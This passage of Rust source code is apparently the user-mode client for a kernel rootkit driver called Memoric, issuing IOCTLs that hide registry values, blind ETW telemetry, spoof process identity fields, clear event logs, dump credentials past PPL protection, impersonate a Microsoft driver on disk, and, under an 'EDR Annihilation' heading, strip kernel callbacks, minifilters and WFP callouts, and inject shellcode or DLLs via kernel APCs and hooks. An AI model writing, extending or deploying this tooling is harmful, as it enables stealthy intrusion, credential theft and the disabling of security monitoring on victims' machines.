            let vlen = wide_val.len().min(127);
            req.value_name[..vlen].copy_from_slice(&wide_val[..vlen]);
        }
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<RegHideRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_REG_HIDE,
            input,
            std::mem::size_of::<RegHideResponse>(),
        )?;
        if output.len() < std::mem::size_of::<RegHideResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete reg hide response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const RegHideResponse) })
    }

    /// Lock/protect files from deletion, modification, or reading.
    pub fn file_lock(
        &self,
        action: u32,
        protect_flags: u32,
        path: &str,
        allowed_pid: u32,
    ) -> Result<FileLockResponse, MemoricError> {
        let mut req = FileLockRequest {
            action,
            protect_flags,
            file_path: [0u16; 260],
            allowed_pid,
            reserved: 0,
        };
        let wide: Vec<u16> = path.encode_utf16().collect();
        let len = wide.len().min(259);
        req.file_path[..len].copy_from_slice(&wide[..len]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<FileLockRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_FILE_LOCK,
            input,
            std::mem::size_of::<FileLockResponse>(),
        )?;
        if output.len() < std::mem::size_of::<FileLockResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete file lock response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const FileLockResponse) })
    }

    /// Disable/enable ETW providers by GUID — blind telemetry.
    pub fn etw_blind(
        &self,
        action: u32,
        provider_guid: &[u8; 16],
    ) -> Result<EtwBlindResponse, MemoricError> {
        let req = EtwBlindRequest {
            action,
            reserved: 0,
            provider_guid: *provider_guid,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<EtwBlindRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_ETW_BLIND,
            input,
            std::mem::size_of::<EtwBlindResponse>(),
        )?;
        if output.len() < std::mem::size_of::<EtwBlindResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete ETW blind response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const EtwBlindResponse) })
    }

    /// Spoof EPROCESS fields (ImageFileName, CommandLine, ParentPID).
    pub fn eprocess_spoof(
        &self,
        action: u32,
        pid: u32,
        new_name: Option<&str>,
        new_cmdline: Option<&str>,
        new_parent_pid: u32,
    ) -> Result<EprocessSpoofResponse, MemoricError> {
        let mut req = EprocessSpoofRequest {
            action,
            process_id: pid,
            new_image_name: [0u8; 16],
            new_command_line: [0u16; 260],
            new_parent_pid,
            reserved: 0,
        };
        if let Some(name) = new_name {
            let name_bytes = name.as_bytes();
            let len = name_bytes.len().min(15);
            req.new_image_name[..len].copy_from_slice(&name_bytes[..len]);
        }
        if let Some(cmd) = new_cmdline {
            let wide: Vec<u16> = cmd.encode_utf16().collect();
            let len = wide.len().min(259);
            req.new_command_line[..len].copy_from_slice(&wide[..len]);
        }
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<EprocessSpoofRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_EPROCESS_SPOOF,
            input,
            std::mem::size_of::<EprocessSpoofResponse>(),
        )?;
        if output.len() < std::mem::size_of::<EprocessSpoofResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete eprocess spoof response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const EprocessSpoofResponse) })
    }

    /// Clear Windows event logs from kernel mode.
    pub fn event_log_clear(
        &self,
        action: u32,
        log_name: Option<&str>,
    ) -> Result<EventLogClearResponse, MemoricError> {
        let mut req = EventLogClearRequest {
            action,
            reserved: 0,
            log_name: [0u16; 64],
        };
        if let Some(name) = log_name {
            let wide: Vec<u16> = name.encode_utf16().collect();
            let len = wide.len().min(63);
            req.log_name[..len].copy_from_slice(&wide[..len]);
        }
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<EventLogClearRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_EVENT_LOG_CLEAR,
            input,
            std::mem::size_of::<EventLogClearResponse>(),
        )?;
        if output.len() < std::mem::size_of::<EventLogClearResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete event log clear response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const EventLogClearResponse) })
    }

    /// Read process memory from kernel mode (bypass PPL protection).
    pub fn cred_dump(
        &self,
        action: u32,
        pid: u32,
        address: u64,
        size: u32,
    ) -> Result<Vec<u8>, MemoricError> {
        let req = CredDumpRequest {
            action,
            process_id: pid,
            address,
            size,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CredDumpRequest>(),
            )
        };
        let output_size = std::mem::size_of::<CredDumpResponse>() + size as usize;
        self.ioctl(IOCTL_MEMORIC_CRED_DUMP, input, output_size)
    }

    /// Impersonate — swap driver file on disk with a legitimate MS driver.
    pub fn driver_impersonate(
        &self,
        action: u32,
        target: &str,
        legit: &str,
    ) -> Result<DriverImpersonateResponse, MemoricError> {
        let mut req = DriverImpersonateRequest {
            action,
            reserved: 0,
            target_path: [0u16; 260],
            legit_path: [0u16; 260],
        };
        let wide_t: Vec<u16> = target.encode_utf16().collect();
        let len_t = wide_t.len().min(259);
        req.target_path[..len_t].copy_from_slice(&wide_t[..len_t]);
        let wide_l: Vec<u16> = legit.encode_utf16().collect();
        let len_l = wide_l.len().min(259);
        req.legit_path[..len_l].copy_from_slice(&wide_l[..len_l]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<DriverImpersonateRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_DRIVER_IMPERSONATE,
            input,
            std::mem::size_of::<DriverImpersonateResponse>(),
        )?;
        if output.len() < std::mem::size_of::<DriverImpersonateResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete driver impersonate response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const DriverImpersonateResponse) })
    }

    // ── Phase 14: EDR Annihilation ──

    pub fn callback_nuke(
        &self,
        action: u32,
        callback_type: u32,
        index: u32,
    ) -> Result<CallbackNukeResponse, MemoricError> {
        let req = CallbackNukeRequest {
            action,
            callback_type,
            index,
            reserved: 0,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<CallbackNukeRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_CALLBACK_NUKE,
            input,
            std::mem::size_of::<CallbackNukeResponse>(),
        )?;
        if output.len() < std::mem::size_of::<CallbackNukeResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete callback nuke response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const CallbackNukeResponse) })
    }

    pub fn minifilter_detach(
        &self,
        action: u32,
        filter_name: &str,
        frame_id: u32,
    ) -> Result<MinifilterDetachResponse, MemoricError> {
        let mut req = MinifilterRequest {
            action,
            reserved: 0,
            filter_name: [0u16; 64],
            frame_id,
            reserved2: 0,
        };
        let wide: Vec<u16> = filter_name.encode_utf16().collect();
        let len = wide.len().min(63);
        req.filter_name[..len].copy_from_slice(&wide[..len]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<MinifilterRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_MINIFILTER_DETACH,
            input,
            std::mem::size_of::<MinifilterDetachResponse>(),
        )?;
        if output.len() < std::mem::size_of::<MinifilterDetachResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete minifilter response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const MinifilterDetachResponse) })
    }

    pub fn kernel_apc_inject(
        &self,
        action: u32,
        pid: u32,
        tid: u32,
        shellcode_size: u32,
        shellcode_addr: u64,
        dll_path: &str,
    ) -> Result<KernelApcResponse, MemoricError> {
        let mut req = KernelApcRequest {
            action,
            process_id: pid,
            thread_id: tid,
            shellcode_size,
            shellcode_addr,
            dll_path: [0u16; 260],
        };
        let wide: Vec<u16> = dll_path.encode_utf16().collect();
        let len = wide.len().min(259);
        req.dll_path[..len].copy_from_slice(&wide[..len]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<KernelApcRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_KERNEL_APC_INJECT,
            input,
            std::mem::size_of::<KernelApcResponse>(),
        )?;
        if output.len() < std::mem::size_of::<KernelApcResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete kernel APC response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const KernelApcResponse) })
    }

    pub fn wfp_remove(
        &self,
        action: u32,
        callout_id: u64,
        provider_name: &str,
    ) -> Result<WfpResponse, MemoricError> {
        let mut req = WfpRequest {
            action,
            reserved: 0,
            callout_id,
            provider_name: [0u16; 64],
        };
        let wide: Vec<u16> = provider_name.encode_utf16().collect();
        let len = wide.len().min(63);
        req.provider_name[..len].copy_from_slice(&wide[..len]);
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<WfpRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_WFP_REMOVE,
            input,
            std::mem::size_of::<WfpResponse>(),
        )?;
        if output.len() < std::mem::size_of::<WfpResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete WFP response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const WfpResponse) })
    }

    /// Kernel-level global function hook
    pub fn global_hook(
        &self,
        action: u32,
        hook_type: u32,
        hook_index: u32,
        module: &str,
        function: &str,
        replacement: u64,
    ) -> Result<Vec<u8>, MemoricError> {
        let mut req = GlobalHookRequest {
            action,
            hook_type,
            hook_index,
            reserved: 0,
            target_module: [0u8; 64],
            target_function: [0u8; 64],
            replacement_addr: replacement,
        };
        let mod_bytes = module.as_bytes();
        let func_bytes = function.as_bytes();
        let mod_len = mod_bytes.len().min(63);
        let func_len = func_bytes.len().min(63);
        req.target_module[..mod_len].copy_from_slice(&mod_bytes[..mod_len]);
        req.target_function[..func_len].copy_from_slice(&func_bytes[..func_len]);

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<GlobalHookRequest>(),
            )
        };
        let max_output = std::mem::size_of::<GlobalHookResponse>()
            + (MAX_GLOBAL_HOOKS - 1) * std::mem::size_of::<GlobalHookEntry>();
        self.ioctl(IOCTL_MEMORIC_GLOBAL_HOOK, input, max_output)
    }

    /// Kernel-level auto-injection on process creation
    pub fn auto_inject(
        &self,
        action: u32,
        flags: u32,
        filter: &str,
    ) -> Result<AutoInjectResponse, MemoricError> {
        let mut req = AutoInjectRequest {
            action,
            flags,
            max_payload_size: 0,
            reserved: 0,
            process_filter: [0u16; 64],
        };
        let filter_wide: Vec<u16> = filter.encode_utf16().collect();
        let copy_len = filter_wide.len().min(63);
        req.process_filter[..copy_len].copy_from_slice(&filter_wide[..copy_len]);

        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<AutoInjectRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_AUTO_INJECT,
            input,
            std::mem::size_of::<AutoInjectResponse>(),
        )?;
        if output.len() < std::mem::size_of::<AutoInjectResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete auto-inject response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const AutoInjectResponse) })
    }

    /// Kernel-level infinity hook (syscall interception via ETW)
    pub fn infinity_hook(
        &self,
        action: u32,
        syscall_number: u32,
        handler: u64,
    ) -> Result<InfinityHookResponse, MemoricError> {
        let req = InfinityHookRequest {
            action,
            syscall_number,
            handler_address: handler,
        };
        let input = unsafe {
            std::slice::from_raw_parts(
                &req as *const _ as *const u8,
                std::mem::size_of::<InfinityHookRequest>(),
            )
        };
        let output = self.ioctl(
            IOCTL_MEMORIC_INFINITY_HOOK,
            input,
            std::mem::size_of::<InfinityHookResponse>(),
        )?;
        if output.len() < std::mem::size_of::<InfinityHookResponse>() {
            return Err(MemoricError::WindowsApi(
                "Incomplete infinity hook response".to_string(),
            ));
        }
        Ok(unsafe { *(output.as_ptr() as *const InfinityHookResponse) })
    }
}

impl Drop for MemoricDriver {
    fn drop(&mut self) {
        if !self.handle.is_invalid() {
            unsafe {
                let _ = CloseHandle(self.handle);
            }
        }
    }
}
